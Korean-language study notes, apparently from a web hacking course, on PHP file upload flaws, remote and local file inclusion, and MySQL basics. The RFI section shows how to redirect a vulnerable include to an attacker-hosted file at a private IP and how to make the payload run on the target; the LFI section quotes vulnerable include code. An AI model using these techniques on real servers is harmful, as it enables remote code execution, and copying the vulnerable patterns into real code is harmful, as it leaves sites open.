<php 파일 업로드 취약점>

	1. 타겟 서버에 php 파일을 업로드.
		이걸 막고자 여러 검증을 넣는다.

	2. 직접 접근이 가능.
		이걸 막고자 다양한 방법으로 파일이 저장되는 위치를 보이지 않게 한다.
		즉 front-end와 back-end의 프로그래밍을 통해서 위치를 숨기고도
		업로드와 다운로드가 가능하게.

</php 파일 업로드 취약점>

<리모트 파일 인클루드 취약점>
	
	- RFI

	- php 파일 내에서 다른 php파일의 소스코드를 가져다가 쓸 수 있는 기능.
	- include 'lib.php';
	- php는 원격 서버에 있는 다른 php 파일을 가져다 쓸 수 있다.

	1. 취약점 확인
		- 취약한 php 어플리케이션
			/var/www/html/zboard/skin/zero_vote/error.php
	
	2. 취약점 이용
		$dir변수가 전역변수이며, 전역변수를 GET을 통해서 외부에서 입력하는 것이
		가능함을 이용하여, <? include '$dir/value.php3 ?>을 실질적으로 
		<? include 'http://192.168.3.230/value.php3 ?>이 되게끔 조작.

	이 공격기법에서 공격자 서버의 php가 켜져 있으면 명령이 공격자 서버에서
	실행되어 그 결과만, 타겟 서버에 전달되는 경우가 있다.
	그래서 공격자 서버의 php확장자 설정에서 .php를 제거하면 된다.
	
	http설정에서 allow_url_fopen = On이 원격 include를 가능하게 함.

	require도 마찬가지이다.

</리모트 파일 인클루드 취약점>

<로컬 파일 인클루드 취약점>

	- LFI
	- 첫 라인에 들어 있는 취약한 코드
		<?php include "auth/$file"; ?>

</로컬 파일 인클루드 취약점>

* front-end언어에 의한 취약점 -> back-end언어에 의한 취약점 -> sql을 이용한 취약점

<SQL을 이용한 취약점>

	- Structured Query Language
	- 표준
	- DBMS마다 문법의 차이는 존재함.
	- DBMS: MySQL, MariaDB, MsSQL, Oracle, DB2, noSQL

	<MySQL 쿼리 문(6개)>

		1. DDL: Data Definition Language - 데이터 정의어
			- 실제 데이터를 조작하지는 못함.
			- DB, TABLE 생성/삭제
			- CREATE, DROP

		2. DML: Data Manipulation Language - 데이터 조작어
			- 데이터를 변경/추가/삭제/확인 등이 가능한 쿼리
			- SELECT, INSERT, DELETE, UPDATE

		3. DCL: Data Control Language - 데이터 제어어
			- 권한, 트랜잭션
			- GRANT
	
	</MySQL 쿼리 문(6개)>

	<DB vs DBMS>

		DataBase: 데이터를 관리하는 단위
		DataBaseManagementSystem

	</DB vs DBMS>

	1. DB생성: CREATE DATABASE <DB name>;
	2. DB삭제: DROP DATABASE <DB name>;
	
	TABLE: 데이터의 형태를 지정.
	
	no(INT), name(CHAR(10)), phone(CHAR(20)), age(INT), gender(CHAR(1)), addr(text)

	<데이터의 타입>

		숫자: INT, FLOAT, DOUBLE
		문자: CHAR, VARCHAR, TEXT
		바이너리: BLOB, LONGBLOB
		시간, 날짜: 
		
	</데이터의 타입>

	3. TABLE생성: CREATE TABLE <table name>(<col name> <col type>, ...);
	4. TABLE삭제: DROP TABLE <table name>

</SQL을 이용한 취약점>